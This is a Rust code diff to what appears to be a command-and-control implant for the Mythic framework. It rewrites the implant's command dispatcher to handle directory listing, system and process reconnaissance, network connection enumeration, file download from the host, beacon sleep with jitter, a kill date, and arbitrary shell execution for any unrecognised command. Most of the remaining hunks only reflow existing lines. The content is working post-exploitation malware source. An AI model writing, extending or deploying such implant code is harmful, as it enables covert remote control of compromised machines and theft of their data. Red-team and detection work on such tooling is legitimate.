@@ -1,4 +1,3 @@
-use link_common::dispatch::dispatch_common;
 use std::env;
 use std::process::Command;
 
@@ -46,23 +45,30 @@ pub fn link_loop() {
 // ── Command dispatch ─────────────────────────────────────────────────────────
 
 fn dispatch(command: &str, parameters: &str) -> String {
-    let raw = if parameters.is_empty() {
-        command.to_string()
-    } else {
-        format!("{} {}", command, parameters)
-    };
-
-    if let Some(output) = dispatch_common(&raw) {
-        return output;
-    }
-
     match command {
+        "ls" => link_common::list_dir(&link_common::extract_param(parameters, "path")),
+        "cd" => std::env::set_current_dir(link_common::extract_param(parameters, "path"))
+            .map(|_| String::new())
+            .unwrap_or_else(|e| format!("[-] {}", e)),
+        "pwd" => std::env::current_dir()
+            .map(|p| p.display().to_string())
+            .unwrap_or_else(|e| format!("[-] {}", e)),
         "whoami" => format!("{}@{}", username(), hostname()),
         "info" => collect_system_info(),
         "ps" => list_processes(),
         "netstat" => list_network_connections(),
+        "download" => link_common::download_file(&link_common::extract_param(parameters, "path")),
+        "upload" => "[-] upload via Mythic file store: implement in Phase 5".to_string(),
+        "sleep" => {
+            let secs = link_common::extract_param(parameters, "seconds");
+            let jitter = link_common::extract_param(parameters, "jitter");
+            link_common::handle_sleep_command(format!("{} {}", secs, jitter).trim())
+        }
+        "killdate" => {
+            link_common::handle_killdate_command(&link_common::extract_param(parameters, "date"))
+        }
         "shell" => shell_exec(parameters),
-        _ => shell_exec(&raw),
+        _ => shell_exec(&format!("{} {}", command, parameters)),
     }
 }
 
@@ -206,14 +212,11 @@ fn list_processes() -> String {
                                     process_name = name.trim().to_string();
                                 }
                             } else if line.starts_with("Pid:") {
-                                if let Ok(p) =
-                                    line.split(':').nth(1).unwrap_or("").trim().parse()
-                                {
+                                if let Ok(p) = line.split(':').nth(1).unwrap_or("").trim().parse() {
                                     process_pid = p;
                                 }
                             } else if line.starts_with("PPid:") {
-                                if let Ok(pp) =
-                                    line.split(':').nth(1).unwrap_or("").trim().parse()
+                                if let Ok(pp) = line.split(':').nth(1).unwrap_or("").trim().parse()
                                 {
                                     process_ppid = pp;
                                 }
@@ -265,8 +268,7 @@ fn get_username_from_uid(uid: u32) -> String {
 
 fn list_network_connections() -> String {
     let mut connections = Vec::new();
-    connections
-        .push("Proto\tLocal Address\t\tRemote Address\t\tState\tPID/Program".to_string());
+    connections.push("Proto\tLocal Address\t\tRemote Address\t\tState\tPID/Program".to_string());
     connections.push("-".repeat(80));
 
     for (proto, path) in [
@@ -362,17 +364,11 @@ fn get_process_from_inode(inode: &str) -> String {
                                     .is_some_and(|s| s.contains(&format!("socket:[{}]", inode)))
                                 {
                                     let status_path = format!("/proc/{}/status", pid_str);
-                                    if let Ok(status) =
-                                        std::fs::read_to_string(&status_path)
-                                    {
+                                    if let Ok(status) = std::fs::read_to_string(&status_path) {
                                         for line in status.lines() {
                                             if line.starts_with("Name:") {
                                                 if let Some(name) = line.split(':').nth(1) {
-                                                    return format!(
-                                                        "{}[{}]",
-                                                        pid_str,
-                                                        name.trim()
-                                                    );
+                                                    return format!("{}[{}]", pid_str, name.trim());
                                                 }
                                             }
                                         }
